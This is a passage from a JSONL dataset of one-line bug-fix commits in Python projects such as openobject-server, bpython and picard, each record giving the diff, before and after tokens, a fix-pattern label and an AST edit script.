[\"Insert\", \"N0\", [\"string:'child_ids'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:''\", \"T\"], 2]]"}
{"project": "openobject-server", "commit_sha": "72f33c2f35f42585337f25c8e8bd0cccb37c026f", "parent_sha": "05edb3ec157b00bf2d9c0a89fbf2839cc5cca7df", "file_path": "openerp/addons/base/res/res_partner.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ class res_partner(osv.osv):\n         if is_company == 'contact':\n             return {'value': {'is_company': is_company, 'title': '','child_ids':''}}\n         elif is_company == 'partner':\n-            return {'value': {'is_company': is_company, 'title': ''}}\n+            return {'value': {'is_company': is_company, 'title': '','parent_id':''}}\n         return {'value': {'is_comapny': '', 'title': ''}}\n         \n     \n", "before": "return { 'value' : { 'is_company' : is_company , 'title' : '' } }", "after": "return { 'value' : { 'is_company' : is_company , 'title' : '' , 'parent_id' : '' } }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 30, 3, 69], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 30, 3, 69], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'parent_id'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:''\", \"T\"], 2]]"}
{"project": "openobject-server", "commit_sha": "91a4a31a5db5eda5a5e3d76d7b8084c24f222f25", "parent_sha": "c6f15c5b7402eee2d12c941e7594b8bfa40e8dae", "file_path": "bin/addons/base/ir/ir_rule.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ class ir_rule(osv.osv):\n \n     def domain_get(self, cr, uid, model_name, context={}):\n         if uid == 1:\n-            return [], [], []\n+            return [], [], ['\"'+self.pool.get(model_name)._table+'\"']\n \n", "before": "return [ ] , [ ] , [ ]", "after": "return [ ] , [ ] , [ '\"' + self . pool . get ( model_name ) . _table + '\"' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 28, 3, 30], [\"binary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"binary_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"+:+\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'\\\"'\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'\\\"'\", \"T\"], 0], [\"Insert\", \"N1\", [\"+:+\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N2\", [\"call\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:_table\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N4\", [\"attribute\", \"N6\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"identifier:model_name\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2], [\"Insert\", \"N6\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N6\", [\".:.\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:pool\", \"T\"], 2]]"}
{"project": "openobject-server", "commit_sha": "1e26ca5406942f0d14129a001ed7d96acd823205", "parent_sha": "c5d9b7831385daa2dcd295a729550b8f4024451e", "file_path": "bin/addons/base/res/res_user.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ class users(osv.osv):\n         if (ids == [uid]):\n             ok = True\n             for k in values.keys():\n-                if k not in ('password','signature','action_id', 'context_lang', 'context_tz'):\n+                if k not in ('password','signature','action_id', 'context_lang', 'context_tz','company_id'):\n                     ok=False\n             if ok:\n                 uid = 1\n", "before": "if k not in ( 'password' , 'signature' , 'action_id' , 'context_lang' , 'context_tz' ) : ok = False", "after": "if k not in ( 'password' , 'signature' , 'action_id' , 'context_lang' , 'context_tz' , 'company_id' ) : ok = False", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 29, 3, 95], [\",:,\", \"T\"], 10], [\"Insert\", [\"tuple\", 3, 29, 3, 95], [\"string:'company_id'\", \"T\"], 11]]"}
{"project": "openobject-server", "commit_sha": "7dcefff3a48d0f63b415177d199c665063a61f3f", "parent_sha": "e8f6455dcf027bad4bbe760d3ff8e0f36a7698f3", "file_path": "bin/report/printscreen/ps_list.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class report_printscreen_list(report_int):\n         if context.get('group_by',False):\n             fields_order.remove(context['group_by'])\n             fields_order.insert(0, context['group_by'])\n-            re =  model.read_group(cr, uid, [], fields_order, context.get('group_by',False),0,None,context)\n+            re =  model.read_group(cr, uid, [('id','in',ids)], fields_order, context.get('group_by',False),0,None,context)\n             rows=[]\n             for r in re:\n                 for f in fields_order:\n", "before": "re = model . read_group ( cr , uid , [ ] , fields_order , context . get ( 'group_by' , False ) , 0 , None , context )", "after": "re = model . read_group ( cr , uid , [ ( 'id' , 'in' , ids ) ] , fields_order , context . get ( 'group_by' , False ) , 0 , None , context )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 45, 3, 47], [\"tuple\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'id'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'in'\", \"T\"], 3], [\"Insert\", \"N0\", [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:ids\", \"T\"], 5], [\"Insert\", \"N0\", [\"):)\", \"T\"], 6]]"}
{"project": "openobject-server", "commit_sha": "17cc29257437a5337cdea52c5d15e38dfeb7719c", "parent_sha": "f0ec9303b600efeb4286b1c856162a0048ec9e16", "file_path": "bin/addons/base/module/wizard/base_module_configuration.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class base_module_configuration(osv.osv_memory):\n     _name = \"base.module.configuration\"\n \n     def start(self, cr, uid, ids, context=None):\n-        todo_ids = self.pool.get('ir.actions.todo').search(cr, uid, ['|', ('state', '=', 'open'), '&', ('state', '=', 'skip'), ('restart', '=', 'onskip')])\n+        todo_ids = self.pool.get('ir.actions.todo').search(cr, uid, ['|', '|', ('restart','=','always'), ('state', '=', 'open'), '&', ('state', '=', 'skip'), ('restart', '=', 'onskip')])\n         if not todo_ids:\n             # When there is no wizard todo it will display message\n             data_obj = self.pool.get('ir.model.data')\n", "before": "todo_ids = self . pool . get ( 'ir.actions.todo' ) . search ( cr , uid , [ '|' , ( 'state' , '=' , 'open' ) , '&' , ( 'state' , '=' , 'skip' ) , ( 'restart' , '=' , 'onskip' ) ] )", "after": "todo_ids = self . pool . get ( 'ir.actions.todo' ) . search ( cr , uid , [ '|' , '|' , ( 'restart' , '=' , 'always' ) , ( 'state' , '=' , 'open' ) , '&' , ( 'state' , '=' , 'skip' ) , ( 'restart' , '=' , 'onskip' ) ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 69, 3, 155], [\"string:'|'\", \"T\"], 3], [\"Insert\", [\"list\", 3, 69, 3, 155], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 69, 3, 155], [\"tuple\", \"N0\"], 5], [\"Insert\", [\"list\", 3, 69, 3, 155], [\",:,\", \"T\"], 6], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'restart'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'='\", \"T\"], 3], [\"Insert\", \"N0\", [\",:,\", \"T\"], 4], [\"Insert\", \"N0\", [\"string:'always'\", \"T\"], 5], [\"Insert\", \"N0\", [\"):)\", \"T\"], 6]]"}
{"project": "openobject-server", "commit_sha": "92da6926e09332aac101735704875918b7b05afb", "parent_sha": "0f0a078c86f52add9e77404a30e706ce307f1de2", "file_path": "openerp/addons/base/res/res_company.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -235,7 +235,7 @@ class res_company(osv.osv):\n             self.cache_restart(cr)\n             return super(res_company, self).create(cr, uid, vals, context=context)\n         obj_partner = self.pool.get('res.partner')\n-        partner_id = obj_partner.create(cr, uid, {'name': vals['name'], 'is_company':True}, context=context)\n+        partner_id = obj_partner.create(cr, uid, {'name': vals['name'], 'is_company':True, 'image': vals['logo']}, context=context)\n         vals.update({'partner_id': partner_id})\n         self.cache_restart(cr)\n         company_id = super(res_company, self).create(cr, uid, vals, context=context)\n", "before": "partner_id = obj_partner . create ( cr , uid , { 'name' : vals [ 'name' ] , 'is_company' : True } , context = context )", "after": "partner_id = obj_partner . create ( cr , uid , { 'name' : vals [ 'name' ] , 'is_company' : True , 'image' : vals [ 'logo' ] } , context = context )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 50, 3, 91], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 50, 3, 91], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'image'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:vals\", \"T\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'logo'\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3]]"}
{"project": "NiftyNet", "commit_sha": "b95e8d8fc12ce5f2e836382ab3ef672d5362079b", "parent_sha": "1e5725449363cdbab26c847862eda738a25afed1", "file_path": "doc/source/conf.py", "project_url": "https://github.com/neo4reo/NiftyNet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def generate_apidocs(*args):\n         apidoc_command_path = os.path.join(sys.prefix, 'bin', 'sphinx-apidoc')\n         apidoc_command_path = os.path.abspath(apidoc_command_path)\n     subprocess.check_call(\n-        [apidoc_command_path, '-o', output_path, module_path] +\n+        [apidoc_command_path, '--separate', '-o', output_path, module_path] +\n         [os.path.join(root_dir_abs, pattern) for pattern in exclude_patterns])\n \n \n", "before": "subprocess . check_call ( [ apidoc_command_path , '-o' , output_path , module_path ] + [ os . path . join ( root_dir_abs , pattern ) for pattern in exclude_patterns ] )", "after": "subprocess . check_call ( [ apidoc_command_path , '--separate' , '-o' , output_path , module_path ] + [ os . path . join ( root_dir_abs , pattern ) for pattern in exclude_patterns ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"identifier:output_path\", 3, 37, 3, 48], [\"list\", 3, 9, 3, 62], 5], [\"Insert\", [\"list\", 3, 9, 3, 62], [\"string:'--separate'\", \"T\"], 3], [\"Insert\", [\"list\", 3, 9, 3, 62], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 9, 3, 62], [\",:,\", \"T\"], 9], [\"Delete\", [\",:,\", 3, 35, 3, 36]]]"}
{"project": "osf.io", "commit_sha": "ca2f19eaac27b0816c9828b998ab58ffdac9d35f", "parent_sha": "ea05ede9002ba9f4028ba2ec48577a7af9b28ed3", "file_path": "api_tests/base/test_serializers.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class TestNodeSerializerAndRegistrationSerializerDifferences(ApiTestCase):\n         # fields that are visible for withdrawals\n         visible_on_withdrawals = ['contributors', 'date_created', 'description', 'id', 'links', 'registration', 'title', 'type', 'current_user_can_comment']\n         # fields that do not appear on registrations\n-        non_registration_fields = ['registrations', 'draft_registrations']\n+        non_registration_fields = ['registrations', 'draft_registrations', 'templated_from']\n \n         for field in NodeSerializer._declared_fields:\n             assert_in(field, RegistrationSerializer._declared_fields)\n", "before": "non_registration_fields = [ 'registrations' , 'draft_registrations' ]", "after": "non_registration_fields = [ 'registrations' , 'draft_registrations' , 'templated_from' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 35, 3, 75], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 35, 3, 75], [\"string:'templated_from'\", \"T\"], 5]]"}
{"project": "osf.io", "commit_sha": "52b69adf95eebf7c4ecd70af30f29b37d3ec2438", "parent_sha": "b01158bebf50147d0e16d30b6f519581f4f8b7db", "file_path": "addons/dropbox/models.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -183,8 +183,8 @@ class NodeSettings(BaseStorageAddon, BaseOAuthNodeSettings):\n         except ApiError as error:\n             raise HTTPError(http.BAD_REQUEST, data={\n                 'message_short': error.user_message_text,\n-                'message_long': error.user_message_text\n-                })\n+                'message_long': error.user_message_text,\n+            })\n         except DropboxException:\n             raise HTTPError(http.BAD_REQUEST)\n \n", "before": "error : raise HTTPError ( http . BAD_REQUEST , data = { 'message_short' : error . user_message_text , 'message_long' : error . user_message_text } )", "after": "error : raise HTTPError ( http . BAD_REQUEST , data = { 'message_short' : error . user_message_text , 'message_long' : error . user_message_text , } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 1, 52, 4, 18], [\",:,\", \"T\"], 4]]"}
{"project": "erpnext", "commit_sha": "f28a5da952cb97a0de711817b07f5944a10316fe", "parent_sha": "ddd4ce51b8b9656dfeb0ba70653f15b74b881658", "file_path": "erpnext/utilities/address_and_contact.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def get_permitted_and_not_permitted_links(doctype):\n \tmeta = frappe.get_meta(doctype)\n \n \tfor df in meta.get_link_fields():\n-\t\tif df.options not in (\"Customer\", \"Supplier\", \"Sales Partner\"):\n+\t\tif df.options not in (\"Customer\", \"Supplier\", \"Company\", \"Sales Partner\"):\n \t\t\tcontinue\n \n \t\tif frappe.has_permission(df.options):\n", "before": "if df . options not in ( \"Customer\" , \"Supplier\" , \"Sales Partner\" ) : continue", "after": "if df . options not in ( \"Customer\" , \"Supplier\" , \"Company\" , \"Sales Partner\" ) : continue", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 24, 3, 65], [\"string:\\\"Company\\\"\", \"T\"], 5], [\"Insert\", [\"tuple\", 3, 24, 3, 65], [\",:,\", \"T\"], 6]]"}
{"project": "aspect-tools", "commit_sha": "3b092a2dd6fbb37230bcf636d4c578846d364f01", "parent_sha": "6a0729b191955e32a21b7aea7025ff9b1bedbabf", "file_path": "render_icons.py", "project_url": "https://github.com/bloerg/aspect-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ def fits_to_files ( filename, icon_size, icon_style, output_base_dir):\n                 fig.savefig(output_filename, transparent=True)\n                 plt.close()\n     except IOError:\n-        sys.stderr.write(''.join(('Error: could not read fits file: ', filename)))\n+        sys.stderr.write(''.join(('Error: could not read fits file: ', filename, \"\\n\")))\n \n def processDirectory (args, dirname, filenames ):\n     \n", "before": "except IOError : sys . stderr . write ( '' . join ( ( 'Error: could not read fits file: ' , filename ) ) )", "after": "except IOError : sys . stderr . write ( '' . join ( ( 'Error: could not read fits file: ' , filename , \"\\n\" ) ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 34, 3, 81], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 34, 3, 81], [\"string:\\\"\\\\n\\\"\", \"T\"], 5]]"}
{"project": "aspect-tools", "commit_sha": "f31cf8bcdd48cff64430dc8c5be2ce9056cc1aca", "parent_sha": "3b092a2dd6fbb37230bcf636d4c578846d364f01", "file_path": "render_icons.py", "project_url": "https://github.com/bloerg/aspect-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -91,7 +91,7 @@ def smp_fits_to_files ( queue ):\n         for task in iter(queue.get, 'STOP'):\n             fits_to_files( task[0], task[1], task[2], task[3])\n     except:\n-        sys.stderr.write(''.join(('Something went wrong with ', task[0])))\n+        sys.stderr.write(''.join(('Something went wrong with ', task[0], \"\\n\")))\n     return True\n     \n \n", "before": "except : sys . stderr . write ( '' . join ( ( 'Something went wrong with ' , task [ 0 ] ) ) )", "after": "except : sys . stderr . write ( '' . join ( ( 'Something went wrong with ' , task [ 0 ] , \"\\n\" ) ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 34, 3, 73], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 34, 3, 73], [\"string:\\\"\\\\n\\\"\", \"T\"], 5]]"}
{"project": "gratipay.com", "commit_sha": "c37f8defa0db3bd58045a22adf9b4e7030d2a2a7", "parent_sha": "68b67e27bbb03297255524275f62f16a7e52c173", "file_path": "gittip/elsewhere/__init__.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class AccountElsewhere(object):\n-        typecheck(user_id, (int, unicode), user_info, (None, dict))\n+        typecheck(user_id, (int, unicode, long), user_info, (None, dict))\n         self.user_id = unicode(user_id)\n         self.db = db\n \n", "before": "typecheck ( user_id , ( int , unicode ) , user_info , ( None , dict ) )", "after": "typecheck ( user_id , ( int , unicode , long ) , user_info , ( None , dict ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 0, 28, 0, 42], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 0, 28, 0, 42], [\"identifier:long\", \"T\"], 5]]"}
{"project": "moul-scripts", "commit_sha": "3299df918df15efda4c6b6e140e01a7fccbcd33d", "parent_sha": "6172b39cd0c7b4c3e1d0c4281f73af48c1d9c232", "file_path": "Python/ki/__init__.py", "project_url": "https://github.com/Mirphak/moul-scripts", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2539,7 +2539,7 @@ class xKI(ptModifier):\n             mKIdialog = KIMini.dialog\n \n         # Optimization: only do this if we are fading or have faded\n-        if self.chatMgr.fadeMode in (kChat.FadeDoingFade, kChat.FadeDone):\n+        if self.chatMgr.fadeMode in (kChat.FadeDoingFade, kChat.FadeDone, kChat.FadeNotActive):\n             mKIdialog.setForeColor(-1, -1, -1, self.originalForeAlpha)\n             mKIdialog.setSelectColor(-1, -1, -1, self.originalSelectAlpha)\n             if self.KILevel == kNormalKI:\n", "before": "if self . chatMgr . fadeMode in ( kChat . FadeDoingFade , kChat . FadeDone ) : mKIdialog . setForeColor ( - 1 , - 1 , - 1 , self . originalForeAlpha ) mKIdialog . setSelectColor ( - 1 , - 1 , - 1 , self . originalSelectAlpha ) if self . KILevel == kNormalKI : ", "after": "if self . chatMgr . fadeMode in ( kChat . FadeDoingFade , kChat . FadeDone , kChat . FadeNotActive ) : mKIdialog . setForeColor ( - 1 , - 1 , - 1 , self . originalForeAlpha ) mKIdialog . setSelectColor ( - 1 , - 1 , - 1 , self . originalSelectAlpha ) if self . KILevel == kNormalKI : ", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 37, 3, 74], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 37, 3, 74], [\"attribute\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:kChat\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:FadeNotActive\", \"T\"], 2]]"}
{"project": "bpython", "commit_sha": "dc05752bc1734f15243038c05709c7e8b6f48101", "parent_sha": "fdf30d4c8f1fcbaf9b09f0468f3b0d6f0a8b6b1f", "file_path": "bpython/autocomplete.py", "project_url": "https://github.com/thomasballinger/bpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -342,7 +342,7 @@ def safe_eval(expr, namespace):\n     try:\n         obj = eval(expr, namespace)\n         return obj\n-    except (NameError,) as e:\n+    except (NameError, AttributeError) as e:\n         # If debugging safe_eval, raise this!\n         # raise e\n         return SafeEvalFailed\n", "before": "try : obj = eval ( expr , namespace ) return obj except ( NameError , ) as e : return SafeEvalFailed", "after": "try : obj = eval ( expr , namespace ) return obj except ( NameError , AttributeError ) as e : return SafeEvalFailed", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 12, 3, 24], [\"identifier:AttributeError\", \"T\"], 3]]"}
{"project": "bpython", "commit_sha": "ce4ab58818cb211bac7324f9a394586832703a42", "parent_sha": "0c773ff340fd3dfe466c85b7b7257d8c5ab34b6d", "file_path": "bpython/autocomplete.py", "project_url": "https://github.com/thomasballinger/bpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -342,7 +342,7 @@ def safe_eval(expr, namespace):\n     try:\n         obj = eval(expr, namespace)\n         return obj\n-    except (NameError, AttributeError) as e:\n+    except (NameError, AttributeError, SyntaxError) as e:\n         # If debugging safe_eval, raise this!\n         # raise e\n         return SafeEvalFailed\n", "before": "try : obj = eval ( expr , namespace ) return obj except ( NameError , AttributeError ) as e : return SafeEvalFailed", "after": "try : obj = eval ( expr , namespace ) return obj except ( NameError , AttributeError , SyntaxError ) as e : return SafeEvalFailed", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 12, 3, 39], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 12, 3, 39], [\"identifier:SyntaxError\", \"T\"], 5]]"}
{"project": "CPS_texturecache", "commit_sha": "734f3ce49ffe1ba98890b51006e28fc974beee6c", "parent_sha": "e5f5378da6e9d861071567c5207d9ad97a99cdc1", "file_path": "main.py", "project_url": "https://github.com/redglory/CPS_texturecache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class Texturecache(Plugin):\n         log.info('Verifying texturecache.py script')\n         try:\n             command = []\n-            command = ['python', self.texturecache_path, 'version']\n+            command = ['python', self.texturecache_path, 'version', self.config_file, self.log_file]\n             p = Popen(command, stdout=PIPE, stderr=STDOUT)\n             response = p.communicate()[0]\n             response = response[:-1] if response.endswith(\"\\n\") else response\n", "before": "command = [ 'python' , self . texturecache_path , 'version' ]", "after": "command = [ 'python' , self . texturecache_path , 'version' , self . config_file , self . log_file ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 23, 3, 68], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 23, 3, 68], [\"attribute\", \"N0\"], 7], [\"Insert\", [\"list\", 3, 23, 3, 68], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 3, 23, 3, 68], [\"attribute\", \"N1\"], 9], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:config_file\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:log_file\", \"T\"], 2]]"}
{"project": "badger", "commit_sha": "ab94f8bfb5c889cee09fb9381c9b028d59663801", "parent_sha": "6065c4a16e3931178c78e34d205665a77df62352", "file_path": "sett/badger.py", "project_url": "https://github.com/TheBB/badger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def build_initial_namespace(setup, parameters):\n     for name, expr in setup.dependencies.items():\n         try:\n             namespace[name] = eval(expr, {}, namespace)\n-        except (TypeError, SyntaxError):\n+        except (TypeError, SyntaxError, NameError):\n             namespace[name] = expr\n     return namespace\n \n", "before": "try : namespace [ name ] = eval ( expr , { } , namespace ) except ( TypeError , SyntaxError ) : namespace [ name ] = expr", "after": "try : namespace [ name ] = eval ( expr , { } , namespace ) except ( TypeError , SyntaxError , NameError ) : namespace [ name ] = expr", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 16, 3, 40], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 16, 3, 40], [\"identifier:NameError\", \"T\"], 5]]"}
{"project": "badger", "commit_sha": "a8b9ba4730f24498da22b1bc3420dad51efc971d", "parent_sha": "7decba27d00a8bd78764577321912ac4ff6da204", "file_path": "badger/__init__.py", "project_url": "https://github.com/TheBB/badger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ def _pandas_dtype(tp):\n \n def _typename(tp) -> str:\n     try:\n-        return {int: 'integer', str: 'string', float: 'float'}[tp]\n+        return {int: 'integer', str: 'string', float: 'float', 'datetime64[ns]': 'datetime'}[tp]\n     except KeyError:\n         base = {list: 'list'}[get_origin(tp)]\n         subs = ', '.join(_typename(k) for k in get_args(tp))\n", "before": "return { int : 'integer' , str : 'string' , float : 'float' } [ tp ]", "after": "return { int : 'integer' , str : 'string' , float : 'float' , 'datetime64[ns]' : 'datetime' } [ tp ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 16, 3, 63], [\",:,\", \"T\"], 6], [\"Insert\", [\"dictionary\", 3, 16, 3, 63], [\"pair\", \"N0\"], 7], [\"Insert\", \"N0\", [\"string:'datetime64[ns]'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'datetime'\", \"T\"], 2]]"}
{"project": "keystone", "commit_sha": "04550e8118e2383b7475c74493f3d88c9fa8f522", "parent_sha": "f640093ba8afb73b92b026362827611ef015e59d", "file_path": "tests/_ldap_livetest.py", "project_url": "https://github.com/theresoft/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def delete_object(name):\n def clear_live_database():\n     roles = ['keystone_admin']\n     groups = ['baz', 'bar', 'tenent4add', 'fake1', 'fake2']\n-    users = ['foo', 'two', 'fake1', 'fake2']\n+    users = ['foo', 'two', 'fake1', 'fake2','no_meta']\n     roles = ['keystone_admin', 'useless']\n \n     for group in groups:\n", "before": "users = [ 'foo' , 'two' , 'fake1' , 'fake2' ]", "after": "users = [ 'foo' , 'two' , 'fake1' , 'fake2' , 'no_meta' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 13, 3, 45], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 3, 13, 3, 45], [\"string:'no_meta'\", \"T\"], 9]]"}
{"project": "webrtc-build", "commit_sha": "79cf8a5b170248f3e255a386eb56ccc57af7df3e", "parent_sha": "615523942d069325be2082d26afad749036adbd6", "file_path": "win/reorder-imports.py", "project_url": "https://github.com/digideskio/webrtc-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def reorder_imports(input_dir, output_dir, architecture):\n     '..\\\\..\\\\..\\\\third_party\\\\syzygy\\\\binaries\\\\exe\\\\swapimport.exe')\n \n   args = [swap_exe, '--input-image=%s' % input_image,\n-      '--output-image=%s' % output_image, '--overwrite']\n+      '--output-image=%s' % output_image, '--overwrite', '--no-logo']\n \n   if architecture == 'x64':\n     args.append('--x64');\n", "before": "args = [ swap_exe , '--input-image=%s' % input_image , '--output-image=%s' % output_image , '--overwrite' ]", "after": "args = [ swap_exe , '--input-image=%s' % input_image , '--output-image=%s' % output_image , '--overwrite' , '--no-logo' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 10, 3, 57], [\",:,\", \"T\"], 8], [\"Insert\", [\"list\", 2, 10, 3, 57], [\"string:'--no-logo'\", \"T\"], 9]]"}
{"project": "picard", "commit_sha": "151616c6a6984b6dc62b0c045bd283f4b33f5502", "parent_sha": "639a6ed5311ed8b0b543ef99dbdc8b1a6f1b5dd7", "file_path": "picard/formats/mutagenext/compatid3.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class CompatID3(ID3):\n         # leave TSOP, TSOA and TSOT even though they are officially defined\n         # only in ID3v2.4, because most applications use them also in ID3v2.3\n         frames = []\n-        for key in [\"TSOP\", \"TSOA\", \"TSOT\"]:\n+        for key in [\"TSOP\", \"TSOA\", \"TSOT\", \"TMOO\"]:\n             frames.extend(self.getall(key))\n         super(CompatID3, self).update_to_v23()\n         for frame in frames:\n", "before": "for key in [ \"TSOP\" , \"TSOA\" , \"TSOT\" ] : frames . extend ( self . getall ( key ) )", "after": "for key in [ \"TSOP\" , \"TSOA\" , 